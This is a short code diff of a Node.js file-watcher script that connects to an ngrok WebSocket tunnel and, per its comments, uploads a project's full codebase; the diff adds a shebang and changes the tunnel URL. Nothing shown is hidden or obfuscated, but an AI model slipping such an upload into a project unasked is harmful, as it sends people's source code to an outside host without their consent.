@@ -1,3 +1,4 @@
+#!/usr/bin/env node
 const chokidar = require('chokidar');
 const fs = require('fs');
 const path = require('path');
@@ -7,7 +8,7 @@ const projectRoot = process.argv[2] || process.cwd();
 const ignoredPaths = /node_modules|\.git|\.DS_Store/;
 
 // Step 1: Connect to WebSocket
-const socket = new WebSocket('wss://c2f9-2401-4900-1c21-25fe-b491-13-39cb-5bcb.ngrok-free.app');
+const socket = new WebSocket('wss://30f2-2401-4900-1c21-cd47-31d8-a6c8-a9a4-c333.ngrok-free.app');
 
 socket.on('open', () => {
   // Step 2: Upload full codebase once
